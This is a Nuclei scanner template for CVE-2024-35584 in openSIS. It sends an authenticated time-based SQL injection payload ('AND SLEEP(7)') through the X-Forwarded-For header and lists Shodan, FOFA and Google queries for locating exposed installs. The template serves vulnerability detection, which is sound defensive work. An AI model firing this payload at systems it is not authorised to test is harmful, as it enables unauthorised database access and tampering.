http:
- matchers:
  - condition: and
    dsl:
    - duration_2>=7
    - contains(body_1, "openSIS") && contains_all(body_2, "donetext:", "\'Done\'")
    - status_code_1 == 200 && status_code_2 == 200
    type: dsl
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    USERNAME={{username}}&PASSWORD={{password}}&language=en&log=

    '
  - '@timeout 20s

    GET /Ajax.php?modname=tools/notallowed.php HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: 122.122.122.122'' AND SLEEP(7) AND ''1''=''1

    '
id: CVE-2024-35584
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-35584
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-89
    epss-percentile: 0.99201
    epss-score: 0.82738
  description: 'SQL injection vulnerability in Ajax.php, ForWindow.php, ForExport.php,
    Modules.php, functions/HackingLogFnc.php in OpenSis Community Edition 9.1, 8.0,
    and possibly earlier versions. It is possible for an authenticated user to perform
    SQL Injection due to the lack to sanitisation. The application takes arbitrary
    value from "X-Forwarded-For" header and appends it to a SQL INSERT statement directly,
    leading to SQL Injection.

    '
  impact: 'Authenticated attackers can perform SQL injection via the X-Forwarded-For
    header, potentially extracting or modifying sensitive database information.

    '
  metadata:
    fofa-query: title="opensis"
    google-query: intitle:"opensis"
    max-request: 2
    product: opensis
    shodan-query: http.title:"opensis"
    vendor: os4ed
  name: openSIS < 9.1 - SQL Injection
  reference:
  - https://www.tenable.com/cve/CVE-2024-35584
  - https://vuldb.com/?id.280406
  - https://github.com/whwhwh96/CVE-2024-35584
  - https://github.com/OS4ED/openSIS-Classic
  - http://opensis.com
  - https://nvd.nist.gov/vuln/detail/CVE-2024-35584
  remediation: 'Update openSIS to a version later than 9.1 that patches the SQL injection
    vulnerability.

    '
  severity: high
  tags: cve,cve2024,opensis,authenticated,sqli,vuln
